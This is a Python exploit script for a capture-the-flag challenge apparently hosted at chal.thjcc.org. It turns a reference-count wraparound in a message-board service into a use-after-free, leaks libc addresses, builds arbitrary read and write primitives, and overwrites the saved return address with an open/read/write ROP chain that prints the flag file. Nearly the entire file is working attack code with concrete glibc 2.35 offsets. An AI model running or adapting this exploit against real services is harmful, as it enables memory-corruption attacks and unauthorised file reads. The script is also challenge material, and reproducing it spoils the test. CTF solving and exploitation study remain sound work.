#!/usr/bin/env python3
import argparse
import getpass
import os
import re
import socket
import ssl
import struct
import sys


HOST = "chal.thjcc.org"
PORT = 9004
MENU = b"7) list         0) quit\n> "
# The final libc PT_LOAD has p_vaddr = p_offset + 0x1000. The unsorted-bin
# pointer is main_arena+0x60 at runtime, hence 0x21ace0 (not file offset
# 0x219ce0).
MAIN_ARENA_96 = 0x21ACE0
ENVIRON = 0x222200

# Ubuntu GLIBC 2.35-0ubuntu3.14 offsets from the bundled libc.
LIBC_START_CALL_MAIN_RET = 0x29D90
POP_RDI = 0x2A3E5
POP_RSI = 0x2BE51
POP_RDX_R12 = 0x11F327
XCHG_EAX_EDI = 0x164F5E
RET = 0x29CD6
OPENAT = 0x1146B0
READ = 0x114810
WRITE = 0x1148B0
EXIT = 0xEABC0


def p64(value):
    return struct.pack("<Q", value)


def u64(data):
    return struct.unpack("<Q", data.ljust(8, b"\0")[:8])[0]


class Tube:
    def __init__(self, host, port, use_ssl=False):
        raw = socket.create_connection((host, port), timeout=12)
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            self.sock = context.wrap_socket(raw, server_hostname=host)
        else:
            self.sock = raw
        self.sock.settimeout(20)
        self.buffer = bytearray()

    def send(self, data):
        self.sock.sendall(data)

    def sendline(self, data=b""):
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")

    def recvuntil(self, marker):
        while marker not in self.buffer:
            chunk = self.sock.recv(8192)
            if not chunk:
                raise EOFError("remote closed the connection")
            self.buffer.extend(chunk)
        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def recvn(self, size):
        while len(self.buffer) < size:
            chunk = self.sock.recv(8192)
            if not chunk:
                raise EOFError("remote closed the connection")
            self.buffer.extend(chunk)
        result = bytes(self.buffer[:size])
        del self.buffer[:size]
        return result

    def recvall(self):
        self.sock.settimeout(2)
        result = bytes(self.buffer)
        self.buffer.clear()
        while True:
            try:
                chunk = self.sock.recv(8192)
            except (TimeoutError, socket.timeout):
                break
            if not chunk:
                break
            result += chunk
        return result


class Board:
    def __init__(self, tube):
        self.io = tube

    def compose(self, slot, length, subject, body):
        assert len(body) == length
        self.io.sendline("1")
        self.io.recvuntil(b"slot> ")
        self.io.sendline(str(slot))
        self.io.recvuntil(b"length> ")
        self.io.sendline(str(length))
        self.io.recvuntil(b"subject> ")
        self.io.sendline(subject)
        self.io.recvuntil(b"body> ")
        self.io.send(body)
        self.io.recvuntil(MENU)

    def discard(self, slot):
        self.io.sendline("2")
        self.io.recvuntil(b"slot> ")
        self.io.sendline(str(slot))
        self.io.recvuntil(MENU)

    def subscribe(self, slot, channel):
        self.io.sendline("3")
        self.io.recvuntil(b"slot> ")
        self.io.sendline(str(slot))
        self.io.recvuntil(b"channel> ")
        self.io.sendline(str(channel))
        self.io.recvuntil(MENU)

    def subscribe_many(self, slot, channels):
        channels = list(channels)
        transcript = b"".join(
            b"3\n" + str(slot).encode() + b"\n" + str(channel).encode() + b"\n"
            for channel in channels
        )
        self.io.send(transcript)
        for _ in channels:
            self.io.recvuntil(MENU)

    def unsubscribe(self, channel):
        self.io.sendline("4")
        self.io.recvuntil(b"channel> ")
        self.io.sendline(str(channel))
        self.io.recvuntil(MENU)

    def replay(self, channel, size):
        self.io.sendline("5")
        self.io.recvuntil(b"channel> ")
        self.io.sendline(str(channel))
        data = self.io.recvn(size)
        self.io.recvuntil(MENU)
        return data

    def amend(self, channel, data):
        self.io.sendline("6")
        self.io.recvuntil(b"channel> ")
        self.io.sendline(str(channel))
        self.io.send(data)
        self.io.recvuntil(MENU)

    def quit(self):
        self.io.sendline("0")


def authenticate(io, token):
    greeting = io.recvuntil(b"token: ")
    if b"Authenticate" not in greeting:
        raise RuntimeError("unexpected gateway greeting")
    io.sendline(token)
    answer = io.recvuntil(b"your chosen(please enter number):")
    if b"OpenAI Codex" not in answer:
        raise RuntimeError("unexpected identity prompt")
    io.sendline("1")
    banner = io.recvuntil(MENU)
    if b"broadcast board" not in banner:
        raise RuntimeError("challenge did not start")


def receive_banner(io):
    banner = io.recvuntil(MENU)
    if b"broadcast board" not in banner:
        raise RuntimeError("challenge did not start")


def forge_message(address, length, refcount=0x80):
    return b"F" * 0x20 + p64(address) + p64(length) + bytes([refcount]) + b"\0" * 7


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--ssl", action="store_true")
    parser.add_argument("--gateway", action="store_true")
    parser.add_argument("--leak-only", action="store_true")
    parser.add_argument(
        "--path",
        action="append",
        help="flag path to try (repeat for multiple paths)",
    )
    args = parser.parse_args()

    io = Tube(args.host, args.port, args.ssl)
    if args.gateway:
        token = os.environ.get("CTFD_TOKEN") or getpass.getpass("CTFd token: ")
        authenticate(io, token)
    else:
        receive_banner(io)
    board = Board(io)

    # 256 aliases wrap the uint8_t reference count from 1 back to 1.
    board.compose(0, 0x500, b"victim", b"V" * 0x500)
    board.subscribe_many(0, range(256))
    board.discard(0)

    # The body is now in the unsorted bin, but every channel still references
    # the freed Message. Replaying one leaks main_arena through fd/bk.
    leak = board.replay(1, 0x500)
    print(f"unsorted fd = {u64(leak[0:8]):#x}")
    print(f"unsorted bk = {u64(leak[8:16]):#x}")
    if args.leak_only:
        return

    libc = u64(leak[0:8]) - MAIN_ARENA_96
    if libc & 0xFFF:
        raise RuntimeError(f"invalid libc base: {libc:#x}")
    print(f"libc base  = {libc:#x}")

    # malloc(0x38) returns the freed Message chunk as the new body. Its bytes
    # therefore become the fields seen by the stale channel pointers.
    board.compose(0, 0x38, b"controller", forge_message(0, 8))
    board.unsubscribe(0)       # fake refcount: 0x80 -> 0x7f
    board.subscribe(0, 0)      # channel 0 now owns the real controller

    def arbitrary_read(address, size):
        board.amend(0, forge_message(address, size))
        return board.replay(1, size)

    def arbitrary_write(address, data):
        board.amend(0, forge_message(address, len(data)))
        board.amend(1, data)

    stack = u64(arbitrary_read(libc + ENVIRON, 8))
    print(f"environ    = {stack:#x}")
    stack_start = stack - 0x800
    stack_dump = arbitrary_read(stack_start, 0x800)
    print("candidate code pointers on the active stack:")
    for offset in range(0, len(stack_dump), 8):
        value = u64(stack_dump[offset:offset + 8])
        if libc <= value < libc + 0x230000:
            print(f"  {stack_start + offset:#x}: {value:#x} (libc+{value-libc:#x})")

    saved_rips = [
        stack_start + offset
        for offset in range(0, len(stack_dump), 8)
        if u64(stack_dump[offset:offset + 8]) == libc + LIBC_START_CALL_MAIN_RET
    ]
    if len(saved_rips) != 1:
        raise RuntimeError(f"expected one live main return address, found {saved_rips}")
    saved_rip = saved_rips[0]
    print(f"saved RIP   = {saved_rip:#x}")

    candidates = tuple(path.encode() for path in args.path) if args.path else (b"/flag",)
    chain_size = (24 * len(candidates) + 3) * 8
    path_area = (chain_size + 0x1FF) & ~0xFF
    output_area = path_area + 0x100
    path_blob = bytearray()
    path_addresses = []
    for candidate in candidates:
        path_addresses.append(saved_rip + path_area + len(path_blob))
        path_blob.extend(candidate + b"\0")

    chain = []
    for index, path in enumerate(path_addresses):
        output = saved_rip + output_area + index * 0x80
        chain.extend((
            libc + POP_RDI, 0xFFFFFFFFFFFFFF9C,       # AT_FDCWD
            libc + POP_RSI, path,
            libc + POP_RDX_R12, 0, 0,
            libc + OPENAT,
            libc + XCHG_EAX_EDI,
            libc + RET,                              # preserve alignment
            libc + POP_RSI, output,
            libc + POP_RDX_R12, 0x80, 0,
            libc + READ,
            libc + POP_RDI, 1,
            libc + POP_RSI, output,
            libc + POP_RDX_R12, 0x80, 0,
            libc + WRITE,
        ))
    chain.extend((libc + POP_RDI, 0, libc + EXIT))
    rop = b"".join(p64(value) for value in chain)
    if len(rop) > path_area:
        raise RuntimeError("ROP chain overlaps its pathname area")
    payload = (
        rop.ljust(path_area, b"\0")
        + bytes(path_blob).ljust(output_area - path_area, b"\0")
        + b"?" * (0x80 * len(candidates))
    )
    arbitrary_write(saved_rip, payload)
    board.quit()

    result = io.recvall()
    match = re.search(rb"THJCC\{[^}\r\n]+\}", result)
    if not match:
        sys.stdout.buffer.write(result)
        raise RuntimeError("ROP ran without returning a recognizable flag")
    print(f"flag        = {match.group().decode()}")


if __name__ == "__main__":
    main()
